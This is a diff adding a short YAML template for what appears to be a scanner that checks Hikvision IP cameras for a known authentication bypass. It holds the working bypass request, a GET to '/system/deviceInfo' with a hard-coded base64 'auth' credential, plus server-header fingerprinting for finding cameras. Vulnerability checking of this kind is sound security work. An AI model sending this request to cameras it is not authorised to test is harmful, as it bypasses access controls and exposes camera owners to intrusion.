@@ -1,0 +1,24 @@
+# Hikvision cameras auth vulnerability checker
+# https://vulners.com/nessus/HIKVISION_AUTH_BYPASS.NASL
+# author git://d34db33f-1007 | https://t.me/ju_oj
+
+auth:
+  get:
+    auth: 'YWRtaW46MTEK'
+  headers: []
+  success:
+    status: 200
+  type: get
+  url:
+  - '/system/deviceInfo?'
+category: camera
+contributor: 't.me/ju_oj'
+default_port: 80
+fingerprint:
+  server_header: App-webs/
+  status: 200
+  url:
+  - '/system/deviceInfo?auth=YWRtaW46MTEK'
+name: hikvision
+protocol: http
+ssl: false
